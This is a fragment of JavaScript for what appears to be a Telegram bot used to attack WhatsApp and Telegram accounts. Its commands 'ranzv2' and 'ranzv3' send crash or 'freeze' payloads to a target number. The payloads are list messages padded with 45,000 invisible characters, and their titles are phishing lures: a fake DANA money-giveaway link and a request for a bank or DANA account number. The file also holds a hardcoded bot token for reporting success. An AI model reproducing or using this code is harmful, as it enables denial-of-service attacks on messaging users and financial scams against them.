...
axios.get(`https://api.telegram.org/bot7876147251:AAFs0zJ0glz09I1EU3tbchBorR6dA41G6-8/sendMessage`, {
  params: {
    chat_id: 7713715689,
    text: `
╭──(  🌠 SUCCESS   )
...
bot.command("ranzv3", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  ...
  for (let i = 0; i < 1; i++) {
        await crashtele(target, { ptcp: true });
...
bot.command("ranzv2", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  ...
  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
    await crashwa(target, { ptcp: true });
...
message: {
listResponseMessage: {
title: "Aku lagi sebar DANA Kaget nih! Yuk, sikat segera sebelum melayang 💸💸💸 https://link.dana.id/kaget?c=sy385bz2r&r=df7xws" + "ㅤ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
...
async function crashwa(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
...
message: {
listResponseMessage: {
title: "kirim nomor rekeningnya atau nomor dana" + "ㅤ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
